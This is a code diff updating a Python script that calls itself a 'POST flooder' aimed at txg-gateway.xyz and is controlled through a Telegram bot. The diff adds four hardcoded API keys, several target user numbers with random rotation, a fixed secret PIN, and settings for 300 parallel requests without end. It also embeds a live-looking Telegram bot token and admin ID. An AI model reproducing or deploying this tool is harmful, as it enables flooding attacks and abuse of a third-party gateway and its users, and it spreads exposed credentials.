@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Stable POST flooder for txg-gateway.xyz with Telegram bot control.
-Uses two API keys via POST requests.
+4 API keys with multiple target numbers, auto‑rotation.
 """
 import asyncio
 import aiohttp
@@ -22,22 +22,36 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # ─── TELEGRAM CONFIG (env overrides) ────────────────────
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8822885362:AAFqWv1vAniTnKwuSKI0FwO7mBIuBq3qOw8")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8401097557"))
 
 # ─── ATTACK CONFIG ──────────────────────────────────────
-# Two API configurations (POST payloads)
+# 4 API keys with multiple target numbers
 CONFIGS = [
     {
         "api_key": "86864a72c5e2f3ad32c1c8f52710959f",
-        "cookie": "api_key=86864a72c5e2f3ad32c1c8f52710959f",
-        "toUser": "6283146815",
+        "toUsers": ["6283146815", "9359202969", "9359202968"],
+        "secret_pin": "1234",
+        "remark": "Ultra pelo",
     },
     {
         "api_key": "f692ed462bc0976b5332a11944103df7",
-        "cookie": "api_key=f692ed462bc0976b5332a11944103df7",
-        "toUser": "9359202967",
+        "toUsers": ["9359202969", "9359202968", "9359202967"],
+        "secret_pin": "1234",
+        "remark": "Ultra pelo",
     },
+    {
+        "api_key": "befd28e1b9ba8557fb7f192fc1647e12",
+        "toUsers": ["9359202967", "6283146815", "9359202969"],
+        "secret_pin": "1234",
+        "remark": "TXG PELO",
+    },
+    {
+        "api_key": "ecc00db3db1ed5e9df931ff19cd74b58",
+        "toUsers": ["9359202967", "6283146815", "9359202968"],
+        "secret_pin": "1234",
+        "remark": "TXG PELO",
+    }
 ]
 
 URL = "https://txg-gateway.xyz/client/api/send.php"
@@ -62,7 +76,7 @@ BASE_HEADERS = {
 }
 
 # ─── PERFORMANCE SETTINGS ──────────────────────────────
-CONCURRENT = 300               # parallel requests
+CONCURRENT = 300               # parallel requests (adjust for Railway)
 TOTAL_REQUESTS = 0             # 0 = infinite
 USE_PROXIES = False
 PROXY_FILE = "proxies.txt"
@@ -85,13 +99,15 @@ def load_proxies():
 # ─── ASYNC REQUEST WORKER ──────────────────────────────
 async def fire(session, sem, config, proxy=None):
     async with sem:
-        headers = {**BASE_HEADERS, "Cookie": config["cookie"]}
+        # Random target from the key's list
+        to_user = random.choice(config["toUsers"])
+        headers = {**BASE_HEADERS, "Cookie": f"api_key={config['api_key']}"}
         payload = {
-            "toUser": config["toUser"],
+            "toUser": to_user,
             "amount": 1,
             "api_key": config["api_key"],
-            "secret_pin": "1234",
-            "remark": "Ultra pelo",
+            "secret_pin": config["secret_pin"],
+            "remark": config["remark"],
             "public": True,
             "manual": False,
         }
@@ -239,7 +255,7 @@ async def main():
         job_queue.run_repeating(send_periodic_report, interval=30, first=10)
 
     # Send startup notification
-    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – using POST API.\n/status for stats, /stop to halt.")
+    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – 4 keys, multiple targets.\n/status for stats, /stop to halt.")
 
     # Start bot polling and web server concurrently
     await app.initialize()
